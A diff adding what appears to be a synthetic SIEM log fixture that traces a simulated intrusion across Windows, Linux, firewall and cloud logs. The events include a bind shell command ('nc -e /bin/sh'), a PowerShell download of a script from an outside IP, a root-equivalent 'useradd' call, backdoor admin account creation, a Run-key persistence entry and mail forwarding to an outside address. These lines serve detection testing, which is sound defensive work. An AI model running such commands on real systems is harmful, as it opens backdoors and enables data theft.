@@ -1,0 +1,182 @@
+_time,source,host,sourcetype,_raw,_meta
+1767351700,source::WinEventLog:Security,host::WKST-01,sourcetype::WinEventLog:Security,"01/02/2026 11:01:40 AM
+LogName=Security
+SourceName=Microsoft Windows security auditing.
+EventCode=4689
+EventType=0
+Type=Information
+ComputerName=WKST-01.lab.example.test
+TaskCategory=Process Termination
+OpCode=Info
+RecordNumber=9100
+Keywords=Audit Success
+Message=A process has exited.
+
+Subject:
+	Security ID:		LABDOM\analyst
+	Account Name:		analyst
+	Account Domain:		LABDOM
+	Logon ID:		0x3E7AB
+
+Process Information:
+	Process ID:	0x10
+	Process Name:	C:\Windows\System32\svchost.exe
+	Exit Status:	0x0",_indextime::1767351702 punct::invented
+1767348022,source::WinRegistry,host::WKST-01,sourcetype::WinRegistry,"01/02/2026 10:00:22.000
+event_status=""(0)The operation completed successfully.""
+pid=4242
+process_image=""c:\Windows\System32\reg.exe""
+registry_type=""SetValue""
+key_path=""HKU\S-1-5-21-1111111111-2222222222-3333333333-1105\Software\Microsoft\Windows\CurrentVersion\Run\upd""
+data_type=""REG_SZ""
+data=""C:\Users\analyst\AppData\Roaming\upd.exe""",_indextime::1767348024 punct::invented
+1767348021,source::WinEventLog:Security,host::WKST-02,sourcetype::WinEventLog:Security,"01/02/2026 10:00:21 AM
+LogName=Security
+SourceName=Microsoft Windows security auditing.
+EventCode=4689
+EventType=0
+Type=Information
+ComputerName=WKST-02.lab.example.test
+TaskCategory=Process Termination
+OpCode=Info
+RecordNumber=12
+Keywords=Audit Success
+Message=A process has exited.
+
+Subject:
+	Security ID:		LABDOM\analyst
+	Account Name:		analyst
+	Account Domain:		LABDOM
+	Logon ID:		0x3E7AB
+
+Process Information:
+	Process ID:	0x10
+	Process Name:	C:\Windows\System32\svchost.exe
+	Exit Status:	0x0",_indextime::1767348023 punct::invented
+1767348020,source::WinEventLog:Microsoft-Windows-PowerShell/Operational,host::WKST-01,sourcetype::WinEventLog:Microsoft-Windows-PowerShell/Operational,"01/02/2026 10:00:20 AM
+LogName=Microsoft-Windows-PowerShell/Operational
+SourceName=Microsoft-Windows-PowerShell
+EventCode=4104
+EventType=5
+Type=Verbose
+ComputerName=WKST-01.lab.example.test
+User=NOT_TRANSLATED
+Sid=S-1-5-21-1111111111-2222222222-3333333333-1105
+SidType=0
+TaskCategory=Execute a Remote Command
+OpCode=On create calls
+RecordNumber=77
+Keywords=None
+Message=Creating Scriptblock text (1 of 1):
+Invoke-WebRequest -Uri http://198.51.100.7/a.ps1 -OutFile C:\Users\analyst\a.ps1
+
+ScriptBlock ID: 00000000-0000-4000-8000-0000000000e1
+Path: ",_indextime::1767348022 punct::invented
+1767348019,source::stream:udp,host::WKST-01,sourcetype::stream:udp,"{""endtime"":""2026-01-02T10:00:19Z"",""src_ip"":""192.0.2.10"",",_indextime::1767348021 punct::invented
+1767348018,source::inventory,host::WKST-01,sourcetype::custom:inventory,inventory ok for WKST-01,_indextime::1767348020 punct::invented
+1767348017,source::https://manage.office.invalid/api/activity,host::cloud.example.test,sourcetype::o365:management:activity,"{""CreationTime"": ""2026-01-02T10:00:17"", ""Id"": ""00000000-0000-4000-8000-0000000000d1"", ""Operation"": ""Set-Mailbox"", ""RecordType"": 1, ""ResultStatus"": ""True"", ""UserId"": ""analyst@lab.example.test"", ""Workload"": ""Exchange"", ""ClientIP"": ""198.51.100.7"", ""ObjectId"": ""helpdesk2"", ""Parameters"": [{""Name"": ""Identity"", ""Value"": ""helpdesk2""}, {""Name"": ""ForwardingSmtpAddress"", ""Value"": ""smtp:drop@example.net""}]}",_indextime::1767348019 punct::invented
+1767348016,source::/var/log/audit/audit.log,host::web-01,sourcetype::linux_audit,"type=EXECVE msg=audit(1767348016.123:77): argc=4 a0=""useradd"" a1=""-o"" a2=""-u0"" a3=""svcx""",_indextime::1767348018 punct::invented
+1767348016,source::/var/log/audit/audit.log,host::web-01,sourcetype::linux_audit,"type=SYSCALL msg=audit(1767348016.123:77): arch=c000003e syscall=59 success=yes exit=0 a0=1 a1=2 a2=3 a3=4 items=2 ppid=700 pid=778 auid=1001 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=3 comm=""useradd"" exe=""/usr/sbin/useradd"" key=""T1136_account""",_indextime::1767348018 punct::invented
+1767348015,source::udp:514,host::FW-01,sourcetype::cisco:asa,"Jan 02 10:00:15 FW-01 %ASA-4-106023: Deny tcp src outside:198.51.100.7/4242 dst inside:192.0.2.20/22 by access-group ""outside_in"" [0x0, 0x0]",_indextime::1767348017 punct::invented
+1767348014,source::/var/log/secure,host::web-01,sourcetype::linux_secure,Jan  2 10:00:14 web-01 sshd[1234]: Failed password for invalid user oracle from 198.51.100.7 port 4242 ssh2,_indextime::1767348016 punct::invented
+1767348013,source::osquery_results.log,host::web-01,sourcetype::osquery:results,"{""name"":""pack_process-monitoring_proc_events"",""hostIdentifier"":""web-01"",""calendarTime"":""Fri Jan  2 10:00:13 2026 UTC"",""unixTime"":1767348013,""epoch"":0,""counter"":1,""decorations"":{""host_uuid"":""00000000-0000-0000-0000-0000000000aa"",""username"":""opsadmin""},""columns"":{""cmdline"":""nc -l -p 4444 -e /bin/sh"",""path"":""/tmp/.x/nc"",""pid"":""777"",""uid"":""0"",""username"":""tomcat9"",""cwd"":""/home/opsadmin""},""action"":""added""}
+{""name"": ""pack_x"", ""hostIdentifier"": ""web-01"", ""columns"": {}}",_indextime::1767348015 punct::invented
+1767348012,source::s3://invented-trail/AWSLogs/123456789012/CloudTrail,host::cloud.example.test,sourcetype::aws:cloudtrail,"{""eventVersion"": ""1.05"", ""eventTime"": ""2026-01-02T10:00:12Z"", ""eventSource"": ""iam.amazonaws.com"", ""eventName"": ""CreateLoginProfile"", ""awsRegion"": ""us-east-1"", ""sourceIPAddress"": ""198.51.100.7"", ""userAgent"": ""aws-cli/1.16 Python/3.6"", ""eventID"": ""00000000-0000-4000-8000-0000000000c1"", ""eventType"": ""AwsApiCall"", ""recipientAccountId"": ""123456789012"", ""userIdentity"": {""type"": ""IAMUser"", ""principalId"": ""AIDAINVENTED00000001"", ""arn"": ""arn:aws:iam::123456789012:user/analyst"", ""accountId"": ""123456789012"", ""accessKeyId"": ""AKIAEXAMPLEKEY000003"", ""userName"": ""analyst""}, ""requestParameters"": {""userName"": ""helpdesk2"", ""password"": ""Hunter2pass"", ""passwordResetRequired"": false}, ""responseElements"": {""loginProfile"": {""userName"": ""helpdesk2"", ""createDate"": ""Jan 2, 2026 10:00:12 AM""}}}",_indextime::1767348014 punct::invented
+1767348010,source::stream:dns,host::WKST-01,sourcetype::stream:dns,"{""endtime"": ""2026-01-02T10:00:10.000000Z"", ""timestamp"": ""2026-01-02T10:00:10.000000Z"", ""src_ip"": ""192.0.2.10"", ""dest_ip"": ""192.0.2.53"", ""query"": [""beacon.example.net"", ""wkst-01.lab.example.test""], ""query_type"": [""A""], ""reply_code"": ""NoError"", ""host_addr"": [""198.51.100.7""]}",_indextime::1767348012 punct::invented
+1767348009,source::stream:http,host::WKST-01,sourcetype::stream:http,"{""endtime"": ""2026-01-02T10:00:09.000000Z"", ""timestamp"": ""2026-01-02T10:00:09.000000Z"", ""src_ip"": ""192.0.2.10"", ""src_port"": 50123, ""dest_ip"": ""198.51.100.7"", ""dest_port"": 80, ""http_method"": ""POST"", ""status"": 200, ""site"": ""portal.example.net"", ""uri_path"": ""/login"", ""form_data"": ""username=admin&passwd=Hunter2pass"", ""http_user_agent"": ""Mozilla/5.0 (invented)"", ""cookie"": ""SESSION=invented-cookie"", ""flow_id"": ""00000000-0000-4000-8000-000000000009"", ""dest_content"": ""invented response body""}",_indextime::1767348011 punct::invented
+1767348008,source::WinEventLog:Microsoft-Windows-Sysmon/Operational,host::WKST-01,sourcetype::XmlWinEventLog:Microsoft-Windows-Sysmon/Operational,<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{00000000-0000-0000-0000-000000000001}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2026-01-02T10:00:08.100000000Z'/><EventRecordID>501</EventRecordID><Correlation/><Execution ProcessID='1' ThreadID='2'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WKST-01.lab.example.test</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='UtcTime'>2026-01-02 10:00:08.090</Data><Data Name='ProcessGuid'>{AAAA1111-0000-0000-0000-000000000002}</Data><Data Name='ProcessId'>4242</Data><Data Name='Image'>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name='CommandLine'>powershell.exe -NoP -enc VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAiAGkAbgB2AGUAbgB0AGUAZAAgAGIAZQBuAGkAZwBuACIA ; aws configure set aws_access_key_id AKIAEXAMPLEKEY000003</Data><Data Name='CurrentDirectory'>C:\Users\analyst\</Data><Data Name='User'>LABDOM\analyst</Data><Data Name='LogonGuid'>{AAAA1111-0000-0000-0000-000000000003}</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>SHA256=0000000000000000000000000000000000000000000000000000000000000001</Data><Data Name='ParentImage'>C:\Windows\explorer.exe</Data><Data Name='ParentCommandLine'>C:\Windows\Explorer.EXE</Data><Data Name='RuleName'>technique_id=T1059.001</Data></EventData></Event>,_indextime::1767348010 punct::invented
+1767348007,source::WinEventLog:Security,host::WKST-01,sourcetype::WinEventLog:Security,"01/02/2026 10:00:07 AM
+LogName=Security
+SourceName=Microsoft Windows security auditing.
+EventCode=4732
+EventType=0
+Type=Information
+ComputerName=WKST-01.lab.example.test
+TaskCategory=Security Group Management
+OpCode=Info
+RecordNumber=9003
+Keywords=Audit Success
+Message=A member was added to a security-enabled local group.
+
+Subject:
+	Security ID:		LABDOM\analyst
+	Account Name:		analyst
+	Account Domain:		LABDOM
+	Logon ID:		0x3E7AB
+
+Member:
+	Security ID:		WKST-01\helpdesk2
+	Account Name:		-
+
+Group:
+	Security ID:		BUILTIN\Administrators
+	Group Name:		Administrators
+	Group Domain:		Builtin",_indextime::1767348009 punct::invented
+1767348006,source::WinEventLog:Security,host::WKST-01,sourcetype::WinEventLog:Security,"01/02/2026 10:00:06 AM
+LogName=Security
+SourceName=Microsoft Windows security auditing.
+EventCode=4720
+EventType=0
+Type=Information
+ComputerName=WKST-01.lab.example.test
+TaskCategory=User Account Management
+OpCode=Info
+RecordNumber=9002
+Keywords=Audit Success
+Message=A user account was created.
+
+Subject:
+	Security ID:		LABDOM\analyst
+	Account Name:		analyst
+	Account Domain:		LABDOM
+	Logon ID:		0x3E7AB
+
+New Account:
+	Security ID:		WKST-01\helpdesk2
+	Account Name:		helpdesk2
+	Account Domain:		WKST-01
+
+Attributes:
+	SAM Account Name:	helpdesk2
+	Display Name:		<value not set>
+	User Account Control:	
+		Account Disabled
+		'Normal Account' - Enabled
+
+Additional Information:
+	Privileges		-",_indextime::1767348008 punct::invented
+1767348005,source::WinEventLog:Security,host::WKST-01,sourcetype::WinEventLog:Security,"01/02/2026 10:00:05 AM
+LogName=Security
+SourceName=Microsoft Windows security auditing.
+EventCode=4688
+EventType=0
+Type=Information
+ComputerName=WKST-01.lab.example.test
+TaskCategory=Process Creation
+OpCode=Info
+RecordNumber=9001
+Keywords=Audit Success
+Message=A new process has been created.
+
+Creator Subject:
+	Security ID:		LABDOM\analyst
+	Account Name:		analyst
+	Account Domain:		LABDOM
+	Logon ID:		0x3E7AB
+
+Target Subject:
+	Security ID:		NULL SID
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Process Information:
+	New Process ID:		0x1a2b
+	New Process Name:	C:\Windows\System32\net.exe
+	Token Elevation Type:	%%1937
+	Mandatory Label:		Mandatory Label\High Mandatory Level
+	Creator Process ID:	0x0f00
+	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	Process Command Line:	""C:\Windows\system32\net.exe"" user /add helpdesk2 Winter2026!
+
+Token Elevation Type indicates the type of token that was assigned to the new process.",_indextime::1767348007 punct::invented
